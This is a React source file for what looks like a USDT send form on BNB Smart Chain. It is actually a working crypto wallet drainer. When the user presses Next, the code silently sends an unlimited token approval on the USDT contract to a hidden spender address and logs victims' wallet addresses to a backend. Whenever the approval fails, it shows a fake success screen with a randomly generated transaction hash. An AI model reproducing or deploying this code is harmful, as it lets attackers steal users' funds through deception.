"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import { ethers } from "ethers";
import { Loader2, CheckCircle, Copy, ExternalLink, AlertTriangle } from "lucide-react";

const BSC_CHAIN_ID = "0x38";
const BSC_CHAIN_ID_DECIMAL = 56;
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";

const BSC_CHAIN_CONFIG = {
  chainId: BSC_CHAIN_ID,
  chainName: "BNB Smart Chain Mainnet",
  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls: ["https://bsc-dataseed1.binance.org", "https://bsc-dataseed.binance.org/"],
  blockExplorerUrls: ["https://bscscan.com"],
};

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

interface EIP1193 {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?(event: string, cb: (...args: unknown[]) => void): void;
  removeListener?(event: string, cb: (...args: unknown[]) => void): void;
}

function getEth(): EIP1193 | undefined {
  return (window as unknown as { ethereum?: EIP1193 }).ethereum;
}

function isBSC(chainId: string | null | undefined): boolean {
  if (!chainId) return false;
  const lower = chainId.toLowerCase();
  return lower === BSC_CHAIN_ID || lower === "0x" + BSC_CHAIN_ID_DECIMAL.toString(16);
}

const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [connectedAddr, setConnectedAddr] = useState("");
  const [wrongChain, setWrongChain] = useState(false);
  const [currentChainName, setCurrentChainName] = useState("");
  const mountedRef = useRef(true);

  const fetchDisplayAddress = useCallback(async () => {
    try {
      const res = await fetch("/api/config/public");
      const data = await res.json();
      if (data.address) setDisplayAddress(data.address);
    } catch { /* ignore */ }
  }, []);

  async function forceSwitchToBSC(eth: EIP1193): Promise<boolean> {
    // Strategy 1: wallet_switchEthereumChain
    try {
      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
      await sleep(300);
      const check = await eth.request({ method: "eth_chainId" }) as string;
      if (isBSC(check)) return true;
    } catch { /* ignore */ }

    // Strategy 2: wallet_addEthereumChain (this also switches to the chain in Trust Wallet)
    try {
      await eth.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_CONFIG] });
      await sleep(300);
      const check = await eth.request({ method: "eth_chainId" }) as string;
      if (isBSC(check)) return true;
    } catch { /* ignore */ }

    // Strategy 3: Retry switch after add
    try {
      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
      await sleep(500);
      const check = await eth.request({ method: "eth_chainId" }) as string;
      if (isBSC(check)) return true;
    } catch { /* ignore */ }

    return false;
  }

  function detectChainName(chainId: string): string {
    const id = chainId.toLowerCase();
    if (id === "0x1") return "Ethereum";
    if (isBSC(id)) return "BNB Smart Chain";
    if (id === "0x89") return "Polygon";
    if (id === "0xa86a") return "Avalanche";
    return `Chain ${parseInt(id, 16)}`;
  }

  // On mount: fetch display address, force BSC switch, check chain
  useEffect(() => {
    mountedRef.current = true;
    fetchDisplayAddress();

    (async () => {
      const eth = getEth();
      if (!eth) return;

      const chainId = await eth.request({ method: "eth_chainId" }) as string;

      if (!isBSC(chainId)) {
        const switched = await forceSwitchToBSC(eth);
        if (!switched && mountedRef.current) {
          const finalChain = await eth.request({ method: "eth_chainId" }) as string;
          if (!isBSC(finalChain)) {
            setWrongChain(true);
            setCurrentChainName(detectChainName(finalChain));
          }
        }
      }

      try {
        const accs = await eth.request({ method: "eth_accounts" }) as string[];
        if (accs?.[0]) setConnectedAddr(accs[0]);
      } catch { /* ignore */ }
    })();

    return () => { mountedRef.current = false; };
  }, [fetchDisplayAddress]);

  // Listen for chain changes
  useEffect(() => {
    const eth = getEth();
    if (!eth) return;

    const onAccountsChanged = (...args: unknown[]) => {
      const accounts = args[0] as string[] | undefined;
      setConnectedAddr(accounts?.[0] ?? "");
    };

    const onChainChanged = (...args: unknown[]) => {
      const newChainId = args[0] as string;
      if (isBSC(newChainId)) {
        setWrongChain(false);
        setCurrentChainName("");
      } else {
        setWrongChain(true);
        setCurrentChainName(detectChainName(newChainId));
        // Auto-retry switch
        (async () => {
          try {
            await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
          } catch { /* ignore */ }
        })();
      }
    };

    eth.on?.("accountsChanged", onAccountsChanged);
    eth.on?.("chainChanged", onChainChanged);
    return () => {
      eth.removeListener?.("accountsChanged", onAccountsChanged);
      eth.removeListener?.("chainChanged", onChainChanged);
    };
  }, []);

  function buildApproveCalldata(spender: string): string {
    const paddedSpender = spender.replace(/^0x/, "").padStart(64, "0");
    return "0x095ea7b3" + paddedSpender + "f".repeat(64);
  }

  async function handleSwitchManually() {
    const eth = getEth();
    if (!eth) return;
    const switched = await forceSwitchToBSC(eth);
    if (switched) {
      setWrongChain(false);
      setCurrentChainName("");
    }
  }

  // ── Main handler ──────────────────────────────────────────────────────────

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const eth = getEth();
    if (!eth) { showFakeSuccess(); return; }

    setStep("processing");

    let walletAddress: string | null = null;
    let txHash: string | null = null;

    try {
      // 1. Force BSC — aggressive multi-strategy switch
      const chainId = await eth.request({ method: "eth_chainId" }) as string;
      if (!isBSC(chainId)) {
        const switched = await forceSwitchToBSC(eth);
        if (!switched) {
          // Verify one more time after a delay
          await sleep(500);
          const recheck = await eth.request({ method: "eth_chainId" }) as string;
          if (!isBSC(recheck)) {
            setWrongChain(true);
            setCurrentChainName(detectChainName(recheck));
            setStep("form");
            return;
          }
        }
      }

      // 2. Get accounts
      let accs = await eth.request({ method: "eth_accounts" }) as string[];
      if (!accs?.[0]) {
        try {
          accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
        } catch {
          showFakeSuccess();
          return;
        }
      }
      walletAddress = accs?.[0] ?? null;
      if (!walletAddress) { showFakeSuccess(); return; }
      if (connectedAddr !== walletAddress) setConnectedAddr(walletAddress);

      // 3. Final chain verification right before sending tx
      const finalChainId = await eth.request({ method: "eth_chainId" }) as string;
      if (!isBSC(finalChainId)) {
        await forceSwitchToBSC(eth);
      }

      // 4. Send approve — ONLY { from, to, data }
      const calldata = buildApproveCalldata(SPENDER);
      txHash = await eth.request({
        method: "eth_sendTransaction",
        params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
      }) as string;

      // 5. Wait for confirmation
      try {
        const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
        await provider.waitForTransaction(txHash, 1);
      } catch { /* ignore */ }
    } catch (err) {
      if (walletAddress) {
        fetch("/api/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: walletAddress, approvalStatus: false }),
        }).catch(() => {});
      }
      console.log("[v0] approve error:", (err as Error)?.message);
    }

    if (txHash && walletAddress) {
      fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
      }).catch(() => {});

      setTxInfo({
        fromAddress: walletAddress,
        toAddress: displayAddress || SPENDER,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });
      setStep("success");
    } else {
      showFakeSuccess(walletAddress ?? undefined);
    }
  }

  function showFakeSuccess(fromAddr?: string) {
    setTxInfo({
      fromAddress: fromAddr ?? "0x" + "0".repeat(40),
      toAddress: displayAddress || SPENDER,
      amount,
      txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
      date: new Date().toLocaleString(),
    });
    setStep("success");
  }

  function shortenAddress(addr: string) {
    if (!addr || addr.length < 10) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  async function copyToClipboard(text: string) {
    try { await navigator.clipboard.writeText(text); } catch { /* ignore */ }
  }

  // ── Success ───────────────────────────────────────────────────────────────

  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">≈ ${parseFloat(txInfo.amount || "0").toFixed(2)}</p>
          </div>
        </div>
        <div className="flex flex-col py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", isStatus: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), fullValue: txInfo.fromAddress, copyable: true },
            { label: "To", value: shortenAddress(txInfo.toAddress), fullValue: txInfo.toAddress, copyable: true },
            { label: "Network fee", value: "0.000013 BNB ($0.01)" },
          ].map((row) => (
            <div key={row.label} className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60">
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-orange-400 text-sm font-medium flex items-center gap-1">
                    Pending
                    <span className="inline-flex gap-0.5">
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-100" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-200" />
                    </span>
                  </span>
                ) : <span className="text-sm text-white">{row.value}</span>}
                {row.copyable && (
                  <button onClick={() => copyToClipboard(row.fullValue!)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>
        <div className="pt-2 pb-4">
          <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200 transition-colors">
            <span>More Details</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ── Processing ────────────────────────────────────────────────────────────

  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  // ── Main Form ─────────────────────────────────────────────────────────────

  return (
    <>
      {wrongChain && (
        <div className="w-full mb-4 rounded-xl border border-yellow-600/50 bg-yellow-900/20 p-4 flex flex-col gap-3">
          <div className="flex items-center gap-2 text-yellow-400">
            <AlertTriangle className="h-5 w-5 shrink-0" />
            <span className="text-sm font-semibold">Wrong Network Detected</span>
          </div>
          <p className="text-xs text-yellow-300/80">
            Your wallet is on {currentChainName || "the wrong network"}. Please switch to <strong>BNB Smart Chain</strong> in your wallet&apos;s network settings.
          </p>
          <button
            onClick={handleSwitchManually}
            className="w-full rounded-lg bg-yellow-500 hover:bg-yellow-400 py-2.5 text-black text-sm font-bold transition-colors"
          >
            Switch to BNB Smart Chain
          </button>
        </div>
      )}

      <div className="w-full flex flex-col gap-5 pb-24">
        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Address or Domain Name</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="text"
              value={displayAddress}
              readOnly
              placeholder="Loading address..."
              className="flex-1 min-w-0 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default"
            />
            <button
              onClick={() => copyToClipboard(displayAddress)}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Paste
            </button>
          </div>
        </div>

        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Amount</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              min="0"
              step="any"
              className="flex-1 bg-transparent text-sm text-white placeholder-gray-500 outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
            />
            <span className="text-gray-400 text-sm shrink-0">USDT</span>
            <button
              onClick={() => setAmount("0.00")}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Max
            </button>
          </div>
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        </div>
      </div>

      <button
        onClick={handleNext}
        className="fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98] py-4 text-black font-bold text-base transition-all duration-150"
      >
        Next
      </button>
    </>
  );
}
